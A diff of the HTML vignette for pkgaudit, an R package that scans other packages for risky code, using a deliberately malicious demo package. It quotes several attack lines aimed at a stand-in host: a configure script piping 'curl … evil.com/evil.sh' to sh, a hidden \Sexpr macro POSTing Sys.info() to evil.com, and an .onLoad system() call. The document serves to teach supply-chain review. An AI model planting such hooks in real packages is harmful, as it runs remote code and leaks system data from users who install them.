-<li><p><strong><code>curl</code> in <code>configure</code> runs at
-build, check, and installation from source.</strong> This executes
-before any R code is loaded, and what it executes is not in the package:
-it is whatever the remote host serves at the moment of installation.
-Nothing in the source says what will run.</p></li>
+<li><p>An <code>\Sexpr{}</code> macro in <code>man/fetch_data.Rd</code>
+calls <code><a href="https://httr.r-lib.org/reference/POST.html" class="external-link">httr::POST()</a></code> when the help page is rendered at build,
+check, and source installation. Reviewers should consider whether a help
+page should make an HTTP POST request and what it may send to an
+external host.</p></li>
+<li><p>The <code>\examples{}</code> block in the same help file calls
+<code><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file()</a></code> at check. Reviewers should verify what is
+downloaded. Since this depends on an external host, and what is
+downloaded may change over time, reviewers should also consider how the
+download is used – for example, could another function execute code if
+the file ever contained it?</p></li>
+</ol>
+<pre><code>\name{fetch_data}
+\alias{fetch_data}
+\title{Fetch Data From a URL}
+\description{
+  Downloads the contents of \code{url} to a temporary file.
+  \Sexpr[results=hide]{httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()))}
+}
+\usage{fetch_data(url)}
+\arguments{\item{url}{A URL to download.}}
+\examples{
+download.file("https://www.evil.com/data.csv", tempfile())
+}</code></pre>
+<ol start="3" style="list-style-type: decimal">
+<li>
+<code>.onLoad()</code> in <code>R/zzz.R</code> calls
+<code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> and runs when users call <code><a href="https://rdrr.io/r/base/library.html" class="external-link">library()</a></code>.
+It also runs at build, check, and source installation, each of which
+loads the package. While <code><a href="https://rdrr.io/r/base/system.html" class="external-link">system()</a></code> calls are common in R
+packages, they are less common in lifecycle hooks like
+<code>.onLoad()</code>, and reviewers should inspect what commands would
+be run automatically on their systems.</li>
+</ol>
+<pre><code><span><span class="va">.onLoad</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">libname</span>, <span class="va">pkgname</span><span class="op">)</span> <span class="op">{</span></span>
+<span>  <span class="fu"><a href="https://rdrr.io/r/base/system.html" class="external-link">system</a></span><span class="op">(</span><span class="st">"uname -a"</span><span class="op">)</span></span>
+<span><span class="op">}</span></span></code></pre>
+<ol start="4" style="list-style-type: decimal">
+<li>The <code>configure</code> script may invoke <code>curl</code> at
+build, check, and source installation. Some R packages use
+<code>curl</code> to fetch dependencies that cannot be vendored with the
+package. Reviewers should verify what is fetched and what could happen
+if that changes.</li>
 </ol>
 <pre><code>#!/bin/sh
 echo configuring
 curl -s https://www.evil.com/evil.sh | sh</code></pre>
-<ol start="5" style="list-style-type: decimal">
-<li><p><strong><code>configure</code> is reported as a file, whatever it
-contains.</strong> A <code>configure</code> matching no rule at all
-would still be reported, since the question for a reviewer is whether
-the package should be running a shell script during
-installation.</p></li>
-<li><p><strong><code><a href="https://httr.r-lib.org/reference/POST.html" class="external-link">httr::POST()</a></code> in
-<code>man/fetch_data.Rd</code> runs when the help page is built, and is
-invisible.</strong> The call sits in a
-<code>\Sexpr[results=hide]{}</code> macro in the
-<code>\description{}</code> block. <code>\Sexpr{}</code> is evaluated
-whenever the page is rendered, during <code>R CMD build</code>,
-<code>R CMD check</code>, and installation from source;
-<code>results=hide</code> suppresses its output. A reader of
-<code>?fetch_data</code> sees a one-line description and an example, and
-no sign that rendering the page sent <code><a href="https://rdrr.io/r/base/Sys.info.html" class="external-link">Sys.info()</a></code> to a remote
-host.</p></li>
-</ol>
-<div class="sourceCode" id="cb17"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">[</span><span class="va">result</span><span class="op">$</span><span class="va">patterns</span><span class="op">$</span><span class="va">code_context</span> <span class="op">==</span> <span class="st">"Rd_Sexpr_install"</span>,</span>
-<span>                <span class="fu"><a href="https://rdrr.io/r/base/c.html" class="external-link">c</a></span><span class="op">(</span><span class="st">"rule"</span>, <span class="st">"file_context"</span>, <span class="st">"line_number"</span>, <span class="st">"preview"</span><span class="op">)</span><span class="op">]</span></span>
-<span><span class="co">#&gt;   rule      file_context line_number</span></span>
-<span><span class="co">#&gt; 4 httr man/fetch_data.Rd           6</span></span>
-<span><span class="co">#&gt;                                                                       preview</span></span>
-<span><span class="co">#&gt; 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...</span></span></code></pre></div>
 </div>
-<div class="section level2">
-<h2 id="adjudicating-a-package">Adjudicating a package<a class="anchor" aria-label="anchor" href="#adjudicating-a-package"></a>
-</h2>
-<p>A clean scan is weak evidence of safety. pkgaudit reasons about
-syntax, so sufficiently indirect code can evade any pattern rule. A call
-whose target is a string literal is followed –
-<code>do.call("system", ...)</code> is reported as a <code>system</code>
-finding – but one assembled at runtime is not, since pkgaudit evaluates
-nothing. Matches are weaker still, being matched against text rather
-than a parse tree, so they both miss more and flag more: a
-<code>curl</code> inside a comment is reported, and one assembled from
-shell variables is not.</p>
-<p>A scan with findings is better understood as a reading list than a
-verdict. In review, the questions worth asking are roughly:</p>
-<ul>
-<li>Does the package need this capability at all, given what it claims
-to do?</li>
-<li>Does it run without being asked, at install or load time, rather
-than when a user calls a function?</li>
-<li>Does it reach the network, and if so, is the destination fixed and
-identifiable in the source?</li>
-<li>Is the code being run visible in the source, or is it assembled,
-decoded, or fetched at runtime?</li>
-<li>What did the scan not read, and does any of it run
-automatically?</li>
-</ul>
+<div class="section level3">
+<h3 id="matches-1">Matches<a class="anchor" aria-label="anchor" href="#matches-1"></a>
+</h3>
+<ol style="list-style-type: decimal">
+<li>A regular function in <code>R/fetch.R</code> calls
+<code><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file()</a></code>, but a regular function is not known to run
+automatically, so this pattern is reported under <code>none</code>. A
+reviewer may still want to inspect if and when the function is called,
+and what would be downloaded.</li>
+</ol>
+<pre><code><span><span class="va">fetch_data</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">url</span><span class="op">)</span> <span class="op">{</span></span>
+<span>  <span class="fu"><a href="https://rdrr.io/r/utils/download.file.html" class="external-link">download.file</a></span><span class="op">(</span><span class="va">url</span>, <span class="fu"><a href="https://rdrr.io/r/base/tempfile.html" class="external-link">tempfile</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
+<span><span class="op">}</span></span></code></pre>
+</div>
 </div>
 <div class="section level2">
 <h2 id="exporting-findings">Exporting findings<a class="anchor" aria-label="anchor" href="#exporting-findings"></a>
@@ -406,7 +421,7 @@ automatically?</li>
 <p><code><a href="../reference/emit_sarif.html">emit_sarif()</a></code> renders a result as SARIF 2.1.0, the format
 code-scanning tools publish results in. It returns the document as a
 string and writes nothing.</p>
-<div class="sourceCode" id="cb18"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb20"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">sarif</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/emit_sarif.html">emit_sarif</a></span><span class="op">(</span><span class="va">result</span><span class="op">)</span></span>
 <span><span class="fu"><a href="https://rdrr.io/r/base/substr.html" class="external-link">substr</a></span><span class="op">(</span><span class="va">sarif</span>, <span class="fl">1</span>, <span class="fl">200</span><span class="op">)</span></span>
 <span><span class="co">#&gt; {</span></span>
@@ -420,31 +435,18 @@ string and writes nothing.</p>
 <span><span class="co">#&gt;           "version": "0.4.0",</span></span>
 <span><span class="co">#&gt; </span></span></code></pre></div>
 <p>Written to a file and opened in an editor with a SARIF viewer, each
-finding appears on the line it was found. Rule identifiers are
-namespaced by the kind of rule – <code>pattern/curl</code>,
-<code>match/curl</code>, <code>file/configure</code> – because a rule
-name is unique only within its kind. <code>level</code> is
-<code>note</code> for every result: pkgaudit does not rank findings, so
-nothing is mapped onto SARIF’s severity field, and when a finding’s code
-executes is carried in the result’s <code>properties.phases</code>.</p>
+finding appears on the line it was found. <code>level</code> is
+<code>note</code> for every result. When code executes is carried in
+<code>properties.phases</code>.</p>
 <p><code><a href="../reference/export_unscanned.html">export_unscanned()</a></code> writes the code pkgaudit cannot read
-into a directory a scanner such as Semgrep can be pointed at. A whole
-file is copied verbatim; a vignette chunk in a language with no analyzer
-is written into a file of its own, blank-padded so that its code sits at
-the same line numbers it occupies in the source. A finding another tool
-reports at line 40 of <code>intro.python.py</code> is therefore at line
-40 of <code>intro.Rmd</code>.</p>
-<p><code>untrustedpkg</code> carries nothing in a language pkgaudit
-cannot read, so there is nothing to hand on and the manifest comes back
-empty:</p>
-<div class="sourceCode" id="cb19"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="va">manifest</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/export_unscanned.html">export_unscanned</a></span><span class="op">(</span><span class="va">result</span>, <span class="fu"><a href="https://rdrr.io/r/base/file.path.html" class="external-link">file.path</a></span><span class="op">(</span><span class="fu"><a href="https://rdrr.io/r/base/tempfile.html" class="external-link">tempdir</a></span><span class="op">(</span><span class="op">)</span>, <span class="st">"for-semgrep"</span><span class="op">)</span>,</span>
-<span>                             source <span class="op">=</span> <span class="va">pkg</span><span class="op">)</span></span>
-<span><span class="fu"><a href="https://rdrr.io/r/base/nrow.html" class="external-link">nrow</a></span><span class="op">(</span><span class="va">manifest</span><span class="op">)</span></span>
-<span><span class="co">#&gt; [1] 0</span></span></code></pre></div>
-<p>For a package carrying compiled code, each row of the manifest maps
-an exported file back to where it came from. The directory has no
-default: naming one is how the caller consents to being written to.</p>
+into a directory so that a tool such as Semgrep can scan it. A whole
+file is copied verbatim; a vignette chunk is written into a file of its
+own, blank-padded so that its code sits at the same line numbers it
+occupies in the source. A finding another tool reports at line 40 of
+<code>intro.python.py</code> is therefore at line 40 of
+<code>intro.Rmd</code>. <code>untrustedpkg</code> contains only R and
+Bash, so <code><a href="../reference/export_unscanned.html">export_unscanned()</a></code> would create an empty
+directory.</p>
 </div>
 <div class="section level2">
 <h2 id="auditing-a-tarball">Auditing a tarball<a class="anchor" aria-label="anchor" href="#auditing-a-tarball"></a>
@@ -455,12 +457,12 @@ source package, validates it, extracts it to a temporary directory,
 scans it, and removes the directory. An untrusted archive is itself an
 attack surface, so validation fails closed: the whole archive is refused
 rather than partially extracted.</p>
-<div class="sourceCode" id="cb20"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb21"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="fu"><a href="https://rdrr.io/r/base/print.html" class="external-link">print</a></span><span class="op">(</span><span class="fu"><a href="../reference/audit_tarball.html">audit_tarball</a></span><span class="op">(</span><span class="va">tarball</span><span class="op">)</span>, path <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span></span>
 <span><span class="co">#&gt; --- pkgaudit ----------------------------------------------------------------</span></span>
 <span><span class="co">#&gt; Package:   untrustedpkg v0.1.0 (source tarball)</span></span>
 <span><span class="co">#&gt; SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44</span></span>
-<span><span class="co">#&gt; Scanned:   2026-08-26 22:51 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
+<span><span class="co">#&gt; Scanned:   2026-08-27 00:58 UTC with pkgaudit v0.4.0, rules v0.4.0</span></span>
 <span><span class="co">#&gt; </span></span>
 <span><span class="co">#&gt; File contexts:  1</span></span>
 <span><span class="co">#&gt; Patterns:       4</span></span>
@@ -475,7 +477,7 @@ everything above applies to it unchanged.</p>
 <p>The rules live in a versioned SQLite database shipped with the
 package. <code><a href="../reference/load_rules.html">load_rules()</a></code> reads it;
 <code><a href="../reference/rules_version.html">rules_version()</a></code> reports the version.</p>
-<div class="sourceCode" id="cb21"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb22"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="fu"><a href="../reference/rules_version.html">rules_version</a></span><span class="op">(</span><span class="op">)</span></span>
 <span><span class="co">#&gt; [1] "0.4.0"</span></span>
 <span></span>
@@ -488,7 +490,7 @@ package. <code><a href="../reference/load_rules.html">load_rules()</a></code> re
 SHA-256 sidecar on every call and refuses to load a modified one. The
 hash of an installed copy can also be checked against the value
 published in the <a href="https://github.com/tylerjssmith/pkgaudit#rule-database-integrity" class="external-link">README</a>:</p>
-<div class="sourceCode" id="cb22"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb23"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="fu">digest</span><span class="fu">::</span><span class="fu"><a href="https://eddelbuettel.github.io/digest/man/digest.html" class="external-link">digest</a></span><span class="op">(</span></span>
 <span>  <span class="fu"><a href="https://rdrr.io/r/base/system.file.html" class="external-link">system.file</a></span><span class="op">(</span><span class="st">"db"</span>, <span class="st">"rules.db"</span>, package <span class="op">=</span> <span class="st">"pkgaudit"</span><span class="op">)</span>,</span>
 <span>  algo <span class="op">=</span> <span class="st">"sha256"</span>,</span>
